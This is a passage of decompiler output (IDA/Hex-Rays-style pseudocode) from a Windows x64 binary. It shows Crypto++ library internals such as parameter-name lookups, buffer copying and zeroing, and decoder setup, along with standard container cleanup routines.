      *(_BYTE *)(v3 + 93) = *(_BYTE *)(i + 93);
      *(_BYTE *)(v3 + 94) = *(_BYTE *)(i + 94);
      *(_BYTE *)(v3 + 95) = *(_BYTE *)(i + 95);
    }
    v3 += 96i64;
  }
  return v3;
}

//----- (000000014004D820) ----------------------------------------------------
__int64 __fastcall sub_14004D820(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rsi
  __int64 i; // rdi

  v3 = a3;
  v4 = a2;
  for ( i = a1; i != v4; i += 40i64 )
  {
    if ( v3 )
      sub_14003C000(v3, i);
    v3 += 40i64;
  }
  return v3;
}

//----- (000000014004D880) ----------------------------------------------------
void __fastcall sub_14004D880(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  void *v3; // r8
  void *v4; // rdx

  v2 = a2;
  v3 = *(void **)(a2 + 64);
  memset(*(void **)(a2 + 64), 0, 8i64 * *(_QWORD *)(a2 + 56));
  free(v3);
  v4 = *(void **)(v2 + 24);
  memset(*(void **)(v2 + 24), 0, 8i64 * *(_QWORD *)(v2 + 16));
  free(v4);
}

//----- (000000014004D8E0) ----------------------------------------------------
void __fastcall sub_14004D8E0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  void *v3; // r8
  void *v4; // rdx

  v2 = a2;
  v3 = *(void **)(a2 + 64);
  memset(*(void **)(a2 + 64), 0, 8i64 * *(_QWORD *)(a2 + 56));
  free(v3);
  v4 = *(void **)(v2 + 24);
  memset(*(void **)(v2 + 24), 0, 8i64 * *(_QWORD *)(v2 + 16));
  free(v4);
}

//----- (000000014004D940) ----------------------------------------------------
__int64 __fastcall sub_14004D940(__int64 a1, __int64 a2)
{
  void (__fastcall ***v2)(_QWORD, _QWORD); // rbx
  __int64 v3; // rdi
  void (__fastcall ***i)(_QWORD, _QWORD); // rsi
  __int64 result; // rax

  v2 = *(void (__fastcall ****)(_QWORD, _QWORD))a2;
  v3 = a2;
  if ( *(_QWORD *)a2 )
  {
    for ( i = *(void (__fastcall ****)(_QWORD, _QWORD))(a2 + 8); v2 != i; v2 += 5 )
      (**v2)(v2, 0i64);
    operator delete(*(void **)v3);
    result = 0i64;
    *(_QWORD *)v3 = 0i64;
    *(_QWORD *)(v3 + 8) = 0i64;
    *(_QWORD *)(v3 + 16) = 0i64;
  }
  return result;
}

//----- (000000014004D9A0) ----------------------------------------------------
__int64 __fastcall sub_14004D9A0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 v4; // rax
  void *v5; // rsi
  void *v6; // rcx
  const void *v7; // r8
  signed __int64 v8; // rdx
  const void *v9; // r8

  v2 = a2;
  v3 = a1;
  *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
  *(_DWORD *)(a1 + 12) = *(_DWORD *)(a2 + 12);
  *(_BYTE *)(a1 + 81) = 0;
  v4 = *(_QWORD *)(a2 + 88);
  *(_QWORD *)(a1 + 88) = v4;
  v5 = 0i64;
  if ( *(_QWORD *)(a2 + 88) > 0x10ui64 || *(_BYTE *)(a1 + 81) )
  {
    v6 = 0i64;
  }
  else
  {
    *(_BYTE *)(a1 + 81) = 1;
    v6 = (void *)(a1 + 16);
  }
  *(_QWORD *)(v3 + 96) = v6;
  v7 = *(const void **)(a2 + 96);
  if ( v7 )
    memcpy_s(v6, 4 * v4, v7, 4i64 * *(_QWORD *)(a2 + 88));
  v8 = v3 + 104;
  *(_BYTE *)(v8 + 73) = 0;
  *(_QWORD *)(v8 + 80) = *(_QWORD *)(v2 + 184);
  if ( *(_QWORD *)(v2 + 184) <= 0x10ui64 && !*(_BYTE *)(v3 + 177) )
  {
    *(_BYTE *)(v3 + 177) = 1;
    v5 = (void *)((-(signed int)v8 & 0xF) + v8);
  }
  *(_QWORD *)(v3 + 192) = v5;
  v9 = *(const void **)(v2 + 192);
  if ( v9 )
    memcpy_s(v5, 4i64 * *(_QWORD *)(v3 + 184), v9, 4i64 * *(_QWORD *)(v2 + 184));
  return v3;
}

//----- (000000014004DA90) ----------------------------------------------------
__int64 __fastcall sub_14004DA90(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  void *v3; // rcx
  const void *v4; // r8

  *(_BYTE *)(a1 + 249) = 0;
  v2 = a1;
  *(_QWORD *)(a1 + 256) = *(_QWORD *)(a2 + 256);
  if ( *(_QWORD *)(a2 + 256) > 0x3Cui64 || *(_BYTE *)(a1 + 249) )
  {
    v3 = 0i64;
  }
  else
  {
    *(_BYTE *)(a1 + 249) = 1;
    v3 = (void *)((-(signed int)a1 & 0xF) + a1);
  }
  *(_QWORD *)(v2 + 264) = v3;
  v4 = *(const void **)(a2 + 264);
  if ( v4 )
    memcpy_s(v3, 4i64 * *(_QWORD *)(v2 + 256), v4, 4i64 * *(_QWORD *)(a2 + 256));
  return v2;
}

//----- (000000014004DB10) ----------------------------------------------------
__int64 __fastcall sub_14004DB10(__int64 a1, __int64 a2, const char *a3, __int64 a4, _QWORD *a5, __int64 a6)
{
  __int64 v6; // r13
  __int64 v7; // rbx
  __int64 v8; // rbp
  char *v9; // rdi
  _QWORD *v10; // rdi
  char *v11; // rax
  size_t v12; // r8
  _QWORD *v13; // rax
  _QWORD *v14; // rdi
  size_t v15; // r8
  unsigned __int64 v16; // rsi
  unsigned __int64 v17; // rax
  _QWORD *v18; // rax
  bool v19; // cf
  unsigned __int8 *v20; // rdi
  const char *v21; // rax
  unsigned __int8 *v22; // rdx
  signed __int64 v23; // rax
  int v24; // er8
  int v25; // er9

  *(_QWORD *)a1 = a2;
  v6 = a2;
  v7 = a1;
  *(_QWORD *)(a1 + 8) = a3;
  *(_QWORD *)(a1 + 16) = a4;
  *(_QWORD *)(a1 + 24) = a5;
  *(_WORD *)(a1 + 32) = 0;
  v8 = a4;
  v9 = (char *)a3;
  if ( strcmp(a3, "ValueNames") )
    goto LABEL_26;
  *(_WORD *)(v7 + 32) = 257;
  sub_1400293A0(
    v9,
    (__int64)&std::basic_string<char,std::char_traits<char>,std::allocator<char>> `RTTI Type Descriptor',
    v8);
  if ( a6 )
    (*(void (__fastcall **)(__int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a6 + 8i64))(a6, *(_QWORD *)(v7 + 8), v8, a5);
  if ( (unsigned __int8)type_info::operator!=(
                          &CryptoPP::cls_115<CryptoPP::cls_097> `RTTI Type Descriptor',
                          &CryptoPP::cls_115<CryptoPP::cls_097> `RTTI Type Descriptor') )
    sub_140050AC0(v6 + 32, *(const char **)(v7 + 8), v8, a5);
  v10 = sub_140004CA0(*(void **)(v7 + 24), "ThisPointer:", 0xCui64);
  v11 = (char *)type_info::_name_internal_method(
                  (type_info *)&CryptoPP::cls_115<CryptoPP::cls_097> `RTTI Type Descriptor',
                  (struct __type_info_node *)&unk_1400DC648);
  if ( *v11 )
  {
    v12 = -1i64;
    do
      ++v12;
    while ( v11[v12] );
  }
  else
  {
    v12 = 0i64;
  }
  v13 = sub_140004CA0(v10, v11, v12);
  v14 = v13;
  v15 = v13[2];
  if ( -1i64 - v15 <= 1 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v16 = v15 + 1;
  if ( v15 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v17 = v13[3];
  if ( v17 < v16 )
  {
    sub_140004790(v14, v16, v15);
    if ( !v16 )
      goto LABEL_26;
    goto LABEL_16;
  }
  if ( v16 )
  {
LABEL_16:
    if ( v14[3] < 0x10ui64 )
      v18 = v14;
    else
      v18 = (_QWORD *)*v14;
    *((_BYTE *)v18 + v14[2]) = 59;
    v19 = v14[3] < 0x10ui64;
    v14[2] = v16;
    if ( !v19 )
      v14 = (_QWORD *)*v14;
    *((_BYTE *)v14 + v16) = 0;
    goto LABEL_26;
  }
  v14[2] = 0i64;
  if ( v17 >= 0x10 )
    v14 = (_QWORD *)*v14;
  *(_BYTE *)v14 = 0;
LABEL_26:
  if ( !*(_BYTE *)(v7 + 32) )
  {
    if ( strncmp(*(const char **)(v7 + 8), "ThisPointer:", 0xCui64) )
      goto LABEL_42;
    v20 = *(unsigned __int8 **)(v7 + 8);
    v21 = type_info::_name_internal_method(
            (type_info *)&CryptoPP::cls_115<CryptoPP::cls_097> `RTTI Type Descriptor',
            (struct __type_info_node *)&unk_1400DC648);
    v22 = v20 + 12;
    v23 = v21 - (const char *)(v20 + 12);
    do
    {
      v24 = v22[v23];
      v25 = *v22 - v24;
      if ( *v22 != v24 )
        break;
      ++v22;
    }
    while ( v24 );
    if ( v25 )
    {
LABEL_42:
      if ( !*(_BYTE *)(v7 + 32) )
      {
        if ( a6 )
          *(_BYTE *)(v7 + 32) = (*(__int64 (__fastcall **)(__int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a6 + 8i64))(
                                  a6,
                                  *(_QWORD *)(v7 + 8),
                                  v8,
                                  a5);
        if ( !*(_BYTE *)(v7 + 32)
          && (unsigned __int8)type_info::operator!=(
                                &CryptoPP::cls_115<CryptoPP::cls_097> `RTTI Type Descriptor',
                                &CryptoPP::cls_115<CryptoPP::cls_097> `RTTI Type Descriptor') )
        {
          *(_BYTE *)(v7 + 32) = sub_140050AC0(v6 + 32, *(const char **)(v7 + 8), v8, a5);
        }
      }
    }
    else
    {
      sub_1400293A0(v20, (__int64)&CryptoPP::cls_115<CryptoPP::cls_097> * `RTTI Type Descriptor', *(_QWORD *)(v7 + 16));
      *a5 = v6;
      *(_BYTE *)(v7 + 32) = 1;
    }
  }
  return v7;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A17B8: using guessed type const char *type_info::_name_internal_method(type_info *__hidden this, struct __type_info_node *);
// 1400A1920: using guessed type __int64 __fastcall type_info::operator!=(_QWORD, _QWORD);
// 1400D8E00: using guessed type void *(__fastcall **std::basic_string<char,std::char_traits<char>,std::allocator<char>> `RTTI Type Descriptor')(type_info *this, unsigned int);
// 1400D92F8: using guessed type void *(__fastcall **CryptoPP::cls_115<CryptoPP::cls_097> `RTTI Type Descriptor')(type_info *this, unsigned int);
// 1400D9338: using guessed type void *(__fastcall **CryptoPP::cls_115<CryptoPP::cls_097> * `RTTI Type Descriptor')(type_info *this, unsigned int);

//----- (000000014004DDB0) ----------------------------------------------------
_QWORD *__fastcall sub_14004DDB0(_QWORD *a1, unsigned __int64 a2)
{
  __int64 v2; // rdi
  _QWORD *v3; // rbx

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  if ( sub_140052FE0(a1, a2) )
  {
    sub_14004D5F0((_QWORD *)*v3, v2);
    v3[1] += 24 * v2;
  }
  return v3;
}

//----- (000000014004DE20) ----------------------------------------------------
void **__fastcall sub_14004DE20(void **a1, unsigned __int64 a2)
{
  __int64 v2; // rdi
  void **v3; // rbx

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  if ( sub_140029590(a1, a2) )
  {
    sub_14004D640(*v3, v2);
    v3[1] = (char *)v3[1] + 40 * v2;
  }
  return v3;
}

//----- (000000014004DE90) ----------------------------------------------------
__int64 __fastcall sub_14004DE90(__int64 a1)
{
  __int64 v1; // rbx
  signed __int64 v2; // rdx

  v1 = a1;
  sub_140036DA0(a1 + 8, 1);
  v2 = v1 + 32;
  *(_BYTE *)(v2 + 249) = 0;
  *(_QWORD *)(v2 + 256) = 60i64;
  if ( *(_BYTE *)(v1 + 281) )
  {
    *(_QWORD *)(v1 + 296) = 0i64;
  }
  else
  {
    *(_BYTE *)(v1 + 281) = 1;
    *(_QWORD *)(v1 + 296) = v1 + 32 + (-(signed int)v2 & 0xF);
  }
  return v1;
}

//----- (000000014004DF00) ----------------------------------------------------
__int64 __fastcall sub_14004DF00(__int64 a1, __int64 a2, int a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rax
  __int64 v7; // rax
  int v9; // [rsp+20h] [rbp-58h]
  __int64 v10; // [rsp+28h] [rbp-50h]
  __int64 v11; // [rsp+30h] [rbp-48h]
  __int64 v12; // [rsp+38h] [rbp-40h]
  char v13; // [rsp+40h] [rbp-38h]
  void (__fastcall ***v14)(_QWORD, signed __int64); // [rsp+48h] [rbp-30h]

  v11 = -2i64;
  v4 = a4;
  v5 = a1;
  v12 = a1;
  v10 = a2;
  v9 = a3;
  sub_140057900(a1, 0i64);
  *(_QWORD *)v5 = &off_1400AB048;
  *(_QWORD *)(v5 + 8) = off_1400AB1C8;
  *(_QWORD *)(v5 + 48) = 0i64;
  *(_QWORD *)(v5 + 56) = 0i64;
  *(_QWORD *)(v5 + 64) = 0i64;
  *(_DWORD *)(v5 + 72) = 0;
  *(_QWORD *)(v5 + 88) = 0i64;
  *(_QWORD *)(v5 + 96) = 0i64;
  sub_1400589E0(v5, v4);
  v6 = sub_14004CDA0((__int64)&v13, (__int64)"DecodingLookupArray", &v10, 1);
  v7 = sub_140022A10(v6, (__int64)"Log2Base", &v9, *(_BYTE *)(v6 + 16));
  sub_140066F30(v5, v7);
  if ( v14 )
    (**v14)(v14, 1i64);
  return v5;
}
// 1400AB048: using guessed type __int64 (__fastcall *off_1400AB048)(void *);
// 1400AB1C8: using guessed type __int64 (__fastcall *off_1400AB1C8[3])();

//----- (000000014004DFD0) ----------------------------------------------------
__int64 __fastcall sub_14004DFD0(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  sub_140036DA0(a1, 1);
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_QWORD *)(v1 + 24) = 0i64;
  *(_QWORD *)(v1 + 40) = 0i64;
  *(_QWORD *)(v1 + 48) = 0i64;
  *(_QWORD *)(v1 + 64) = 0i64;
  *(_QWORD *)(v1 + 72) = 0i64;
  *(_QWORD *)(v1 + 88) = 0i64;
  *(_QWORD *)(v1 + 96) = 0i64;
  sub_14003C210((void *)(v1 + 104));
  sub_14003C210((void *)(v1 + 144));
  *(_BYTE *)(v1 + 184) = 1;
  return v1;
}

//----- (000000014004E040) ----------------------------------------------------
__int64 __fastcall sub_14004E040(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  signed __int64 v4; // rax
  __int64 v5; // rax
  char v7; // [rsp+20h] [rbp-58h]
  __int64 v8; // [rsp+28h] [rbp-50h]
  __int64 v9; // [rsp+30h] [rbp-48h]
  unsigned __int64 v10; // [rsp+40h] [rbp-38h]
  void *Memory; // [rsp+48h] [rbp-30h]
  __int64 v12; // [rsp+50h] [rbp-28h]
  char v13; // [rsp+58h] [rbp-20h]
  void (__fastcall ***v14)(_QWORD, signed __int64); // [rsp+60h] [rbp-18h]

  v12 = -2i64;
  v2 = a2;
  v3 = a1;
  sub_140036DA0(a1, 0);
  v4 = -1i64;
  *(_DWORD *)(v3 + 24) = -1;
  *(_BYTE *)(v3 + 32) = 0;
  *(_QWORD *)v3 = &off_1400A9930;
  *(_QWORD *)(v3 + 8) = off_1400A9A98;
  v10 = 0i64;
  Memory = 0i64;
  if ( v2 )
  {
    do
      ++v4;
    while ( *(_BYTE *)(v2 + v4) );
  }
  else
  {
    v4 = 0i64;
  }
  v8 = v2;
  v9 = v4;
  v7 = 0;
  v5 = sub_140036C20((__int64)&v13, (__int64)"InputBuffer", (__int64)&v7, 1);
  sub_14005B030((_QWORD *)v3, v5);
  if ( v14 )
    (**v14)(v14, 1i64);
  memset(Memory, 0, v10);
  free(Memory);
  return v3;
}
// 1400A9930: using guessed type __int64 (__fastcall *off_1400A9930)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();

//----- (000000014004E120) ----------------------------------------------------
void __fastcall sub_14004E120(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rdx
  void *v3; // rdx

  v1 = a1;
  v2 = *(void **)(a1 + 64);
  memset(*(void **)(a1 + 64), 0, 8i64 * *(_QWORD *)(a1 + 56));
  free(v2);
  v3 = *(void **)(v1 + 24);
  memset(*(void **)(v1 + 24), 0, 8i64 * *(_QWORD *)(v1 + 16));
  free(v3);
}

//----- (000000014004E180) ----------------------------------------------------
_DWORD *__fastcall sub_14004E180(__int64 a1)
{
  _DWORD *v1; // rdi
  __int64 v2; // rdx
  _DWORD *result; // rax
  __int64 i; // rcx

  v1 = *(_DWORD **)(a1 + 88);
  v2 = *(_QWORD *)(a1 + 80);
  result = (_DWORD *)(a1 + (-(signed int)a1 & 0xF));
  if ( v1 == result )
  {
    *(_BYTE *)(a1 + 73) = 0;
    result = 0i64;
    for ( i = v2; i; --i )
    {
      *v1 = 0;
      ++v1;
    }
  }
  return result;
}

//----- (000000014004E1B0) ----------------------------------------------------
__int64 __fastcall sub_14004E1B0(__int64 *a1)
{
  __int64 *v1; // rbx
  __int64 result; // rax

  v1 = a1;
  if ( *a1 )
  {
    sub_140053060((__int64)a1, *a1, a1[1]);
    operator delete((void *)*v1);
    result = 0i64;
    *v1 = 0i64;
    v1[1] = 0i64;
    v1[2] = 0i64;
  }
  return result;
}

//----- (000000014004E1F0) ----------------------------------------------------
__int64 __fastcall sub_14004E1F0(__int64 *a1)
{
  __int64 *v1; // rbx
  __int64 result; // rax

  v1 = a1;
  if ( *a1 )
  {
    sub_1400530E0((__int64)a1, *a1, a1[1]);
    operator delete((void *)*v1);
    result = 0i64;
    *v1 = 0i64;
    v1[1] = 0i64;
    v1[2] = 0i64;
  }
  return result;
}

//----- (000000014004E230) ----------------------------------------------------
__int64 __fastcall sub_14004E230(__int64 *a1)
{
  __int64 *v1; // rbx
  __int64 result; // rax

  v1 = a1;
  if ( *a1 )
  {
    sub_140053160((__int64)a1, *a1, a1[1]);
    operator delete((void *)*v1);
    result = 0i64;
    *v1 = 0i64;
    v1[1] = 0i64;
    v1[2] = 0i64;
  }
  return result;
}

//----- (000000014004E270) ----------------------------------------------------
void __fastcall sub_14004E270(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rdx
  unsigned __int64 v3; // rdx
  void *v4; // r8

  v1 = a1;
  v2 = *(void **)(a1 + 64);
  memset(*(void **)(a1 + 64), 0, *(_QWORD *)(a1 + 56));
  free(v2);
  v3 = *(_QWORD *)(v1 + 32);
  v4 = *(void **)(v1 + 40);
  memset(*(void **)(v1 + 40), 0, *(_QWORD *)(v1 + 32));
  if ( v3 < 0x10 )
    free(v4);
  else
    aligned_free(v4);
}

//----- (000000014004E3B0) ----------------------------------------------------
signed __int64 __fastcall sub_14004E3B0(__int64 a1)
{
  signed __int64 v1; // rdx
  __int64 v2; // r8
  _DWORD *v3; // rdi
  __int64 v4; // rcx
  _DWORD *v5; // rdi
  __int64 v6; // rcx
  signed __int64 result; // rax

  v1 = a1 + 104;
  v2 = a1;
  v3 = *(_DWORD **)(a1 + 192);
  v4 = *(_QWORD *)(a1 + 184);
  if ( v3 == (_DWORD *)(v1 + (-(signed int)v1 & 0xF)) )
  {
    *(_BYTE *)(v1 + 73) = 0;
    while ( v4 )
    {
      *v3 = 0;
      ++v3;
      --v4;
    }
  }
  v5 = *(_DWORD **)(v2 + 96);
  v6 = *(_QWORD *)(v2 + 88);
  result = v2 + 16;
  if ( v5 == (_DWORD *)(v2 + 16) )
  {
    *(_BYTE *)(v2 + 81) = 0;
    result = 0i64;
    while ( v6 )
    {
      *v5 = 0;
      ++v5;
      --v6;
    }
  }
  return result;
}

//----- (000000014004E460) ----------------------------------------------------
void *__fastcall sub_14004E460(__int64 a1, char a2)
{
  return sub_14004E490((void *)(a1 - 8), a2);
}

//----- (000000014004E46C) ----------------------------------------------------
_QWORD *__fastcall sub_14004E46C(__int64 a1, char a2)
{
  return sub_14004E570((void *)(a1 - 8), a2);
}

//----- (000000014004E478) ----------------------------------------------------
void *__fastcall sub_14004E478(__int64 a1, char a2)
{
  return sub_14004E650((void *)(a1 - 8), a2);
}

//----- (000000014004E484) ----------------------------------------------------
void *__fastcall sub_14004E484(__int64 a1, char a2)
{
  return sub_140089010((void *)(a1 - 16), a2);
}

//----- (000000014004E490) ----------------------------------------------------
void *__fastcall sub_14004E490(void *a1, char a2)
{
  char *v2; // r8
  void *v3; // rbx
  char *v4; // rdi
  __int64 v5; // rcx

  v2 = (char *)a1 + 32;
  v3 = a1;
  v4 = (char *)*((_QWORD *)a1 + 37);
  v5 = *((_QWORD *)a1 + 36);
  if ( v4 == &v2[-(signed int)v2 & 0xF] )
  {
    v2[249] = 0;
    while ( v5 )
    {
      *(_DWORD *)v4 = 0;
      v4 += 4;
      --v5;
    }
  }
  if ( a2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014004E4F0) ----------------------------------------------------
_QWORD *__fastcall sub_14004E4F0(void *a1, char a2)
{
  char *v2; // rax
  _QWORD *v3; // rbx
  char v4; // si
  char *v5; // rdi
  __int64 v6; // rcx
  _DWORD *v7; // rdi
  __int64 v8; // rcx

  v2 = (char *)a1 + 296;
  v3 = a1;
  v4 = a2;
  v5 = (char *)*((_QWORD *)a1 + 47);
  v6 = *((_QWORD *)a1 + 46);
  if ( v5 == v2 )
  {
    v2[65] = 0;
    while ( v6 )
    {
      *(_DWORD *)v5 = 0;
      v5 += 4;
      --v6;
    }
  }
  v7 = (_DWORD *)v3[36];
  v8 = v3[35];
  if ( v7 == (_DWORD *)(v3 + 26) )
  {
    *((_BYTE *)v3 + 273) = 0;
    while ( v8 )
    {
      *v7 = 0;
      ++v7;
      --v8;
    }
  }
  sub_14004E2F0(v3);
  if ( v4 & 1 )
    operator delete(v3);
  return v3;
}
// 14004E2F0: using guessed type __int64 __fastcall sub_14004E2F0(_QWORD);

//----- (000000014004E570) ----------------------------------------------------
_QWORD *__fastcall sub_14004E570(void *a1, char a2)
{
  char v2; // si
  _QWORD *v3; // rbx
  void *v4; // r8
  void (__fastcall ***v5)(_QWORD, signed __int64); // rcx

  v2 = a2;
  v3 = a1;
  v4 = (void *)*((_QWORD *)a1 + 12);
  memset(*((void **)a1 + 12), 0, *((_QWORD *)a1 + 11));
  free(v4);
  v5 = (void (__fastcall ***)(_QWORD, signed __int64))v3[3];
  if ( v5 )
    (**v5)(v5, 1i64);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014004E5E0) ----------------------------------------------------
_QWORD *__fastcall sub_14004E5E0(void *a1, char a2)
{
  char *v2; // r8
  _QWORD *v3; // rbx
  char *v4; // rdi
  __int64 v5; // rcx
  _DWORD *v6; // rdi
  __int64 v7; // rcx

  v2 = (char *)a1 + 104;
  v3 = a1;
  v4 = (char *)*((_QWORD *)a1 + 24);
  v5 = *((_QWORD *)a1 + 23);
  if ( v4 == &v2[-(signed int)v2 & 0xF] )
  {
    v2[73] = 0;
    while ( v5 )
    {
      *(_DWORD *)v4 = 0;
      v4 += 4;
      --v5;
    }
  }
  v6 = (_DWORD *)v3[12];
  v7 = v3[11];
  if ( v6 == (_DWORD *)(v3 + 2) )
  {
    *((_BYTE *)v3 + 81) = 0;
    while ( v7 )
    {
      *v6 = 0;
      ++v6;
      --v7;
    }
  }
  if ( a2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014004E650) ----------------------------------------------------
void *__fastcall sub_14004E650(void *a1, char a2)
{
  void *v2; // rbx
  void (__fastcall ***v3)(_QWORD, signed __int64); // rcx
  char v4; // di

  v2 = a1;
  v3 = (void (__fastcall ***)(_QWORD, signed __int64))*((_QWORD *)a1 + 3);
  v4 = a2;
  if ( v3 )
    (**v3)(v3, 1i64);
  if ( v4 & 1 )
    operator delete(v2);
  return v2;
}

//----- (000000014004E690) ----------------------------------------------------
signed __int64 __fastcall sub_14004E690(__int64 a1)
{
  return a1 + 192;
}

//----- (000000014004E6A0) ----------------------------------------------------
__int64 __fastcall sub_14004E6A0(__int64 a1)
{
  __int64 result; // rax

  result = (*(__int64 (**)(void))(*(_QWORD *)a1 + 40i64))();
  if ( result )
    result += *(signed int *)(*(_QWORD *)result + 4i64);
  return result;
}

//----- (000000014004E6D0) ----------------------------------------------------
_QWORD *__fastcall sub_14004E6D0(__int64 a1, _QWORD *a2)
{
  size_t v2; // rbx
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  unsigned __int64 v9; // [rsp+40h] [rbp-18h]

  v2 = 0i64;
  v3 = a2;
  v4 = sub_1400508D0(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  if ( *v5 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v5[v2] );
  }
  sub_140004F20(v3, v5, v2);
  return v3;
}

//----- (000000014004E790) ----------------------------------------------------
_QWORD *__fastcall sub_14004E790(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  a2[3] = 15i64;
  v2 = a2;
  a2[2] = 0i64;
  *(_BYTE *)a2 = 0;
  sub_140004F20(a2, &unk_1400AAB58, 3ui64);
  return v2;
}

//----- (000000014004E7D0) ----------------------------------------------------
void __noreturn sub_14004E7D0()
{
  void **v0; // rbx
  __int64 (__fastcall **v1)(void *); // [rsp+30h] [rbp-78h]
  int v2; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v4; // [rsp+60h] [rbp-48h]
  __int64 v5; // [rsp+68h] [rbp-40h]
  char Src; // [rsp+70h] [rbp-38h]

  v0 = sub_14004FF80(&Src);
  std::exception::exception((std::exception *)&v1);
  v1 = &off_1400A8798;
  v2 = 0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v1 = &off_1400A8798;
  CxxThrowException(&v1, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (000000014004E870) ----------------------------------------------------
__int64 __fastcall sub_14004E870(__int64 a1, void *a2, __int64 a3, __int64 *a4)
{
  __int64 *v4; // rbx
  __int64 v5; // rdi
  void *v6; // rbp
  __int64 v7; // rsi
  __int64 result; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !qword_1400DAB40
    || !(unsigned __int8)type_info::operator==(&int const * `RTTI Type Descriptor', &int `RTTI Type Descriptor')
    || (result = qword_1400DAB40(v5, v4, v7 + 32), !(_BYTE)result) )
  {
    sub_1400293A0(v6, (__int64)&int const * `RTTI Type Descriptor', v5);
    result = *(_QWORD *)(v7 + 32);
    *v4 = result;
  }
  return result;
}
// 1400A1928: using guessed type __int64 __fastcall type_info::operator==(_QWORD, _QWORD);
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400D9378: using guessed type const int *int const * `RTTI Type Descriptor';
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014004E900) ----------------------------------------------------
__int64 __fastcall sub_14004E900(__int64 a1, void *a2, __int64 a3, _BYTE *a4)
{
  _BYTE *v4; // rbx
  __int64 v5; // rdi
  void *v6; // rbp
  __int64 v7; // rsi
  __int64 result; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !qword_1400DAB40
    || !(unsigned __int8)type_info::operator==(&bool `RTTI Type Descriptor', &int `RTTI Type Descriptor')
    || (result = qword_1400DAB40(v5, v4, v7 + 32), !(_BYTE)result) )
  {
    sub_1400293A0(v6, (__int64)&bool `RTTI Type Descriptor', v5);
    result = *(unsigned __int8 *)(v7 + 32);
    *v4 = result;
  }
  return result;
}
// 1400A1928: using guessed type __int64 __fastcall type_info::operator==(_QWORD, _QWORD);
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400D9230: using guessed type bool bool `RTTI Type Descriptor';
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014004E990) ----------------------------------------------------
char __fastcall sub_14004E990(__int64 a1, __int64 a2)
{
  sub_14005FFA0(a2);
  return 0;
}

//----- (000000014004E9B0) ----------------------------------------------------
__int64 __fastcall sub_14004E9B0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v6; // rbx
  __int64 v7; // rdi
  __int64 v8; // rsi
  __int64 *v9; // rax

  v6 = a4;
  v7 = a3;
  v8 = a2;
  v9 = (__int64 *)(*(__int64 (**)(void))(*(_QWORD *)a1 + 176i64))();
  sub_14004EBE0(v9, v8, v7, v6, a5, a6);
  return v8;
}

//----- (000000014004EA20) ----------------------------------------------------
__int64 __fastcall sub_14004EA20(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v6; // r15
  __int64 v7; // rbx
  __int64 v8; // r14
  __int64 v9; // rsi
  unsigned __int64 v10; // rdi
  __int64 v11; // rcx
  unsigned __int64 v12; // rax
  __int64 *v13; // rax
  void **v14; // rsi
  void **v15; // rbp
  __int64 v16; // rax
  void *v17; // rdx
  void **v18; // rbx
  void *v19; // rdx
  void *v20; // rdx
  void *v22[2]; // [rsp+30h] [rbp-58h]
  __int64 v23; // [rsp+40h] [rbp-48h]
  char v24; // [rsp+48h] [rbp-40h]
  __int64 v25; // [rsp+58h] [rbp-30h]
